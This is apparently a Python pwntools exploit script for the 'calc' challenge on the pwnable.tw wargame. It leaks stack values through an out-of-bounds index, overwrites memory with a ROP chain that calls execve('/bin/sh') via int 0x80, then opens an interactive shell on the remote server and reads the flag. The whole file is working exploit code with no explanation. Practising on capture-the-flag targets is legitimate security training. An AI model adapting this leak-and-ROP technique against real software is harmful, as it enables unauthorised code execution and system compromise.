from pwn import *

p= remote('chall.pwnable.tw',10100)

# p = process('./calc')
rop = ROP('./calc')
def leak_at(off):
    p.sendline('+%d'%off)
    sleep(0.2)
    response = p.recv(1048)
    response = int(response)
    return response

def write_to(off,data):
    log.info('========>[%d]'%off)
    response = leak_at(off)
    log.info('[LEAK]: %s'%(hex(response)))
    dis=data-response
    if dis>0:
     p.sendline('+%d+%d'%(off,dis))
     af_resp=int(p.recv(1048))
    if dis<0:
     p.sendline('+%d-%d'%(off,abs(dis)))
     af_resp=int(p.recv(1048))
    log.info('[NEED TO ADD]: %d'%dis)
    log.info('[AFTER CHANGE]: %s'%hex(af_resp))
    
off =[361,362,363,364,365,366,367,368,369]
bin_=u32(b'/bin')
sh_=u32(b'/sh\0')
int_0x80=rop.find_gadget(['int 0x80'])[0]
data = [0x805c34b, 0xb, 0x80701d0, 0 ,0 ,0,int_0x80, bin_ ,sh_]
p.read(1048)

def leak_stack():
    p.sendline('+360')
    stack=int(p.recv(1048))
    log.info('[PRE_EBP]: %s'%hex(stack))
    return stack

prev_ebp=leak_stack()
data[5]=prev_ebp
for i in range(9):
     write_to(off[i],data[i])
p.sendline()
p.sendline('cat /home/calc/flag')
p.interactive()
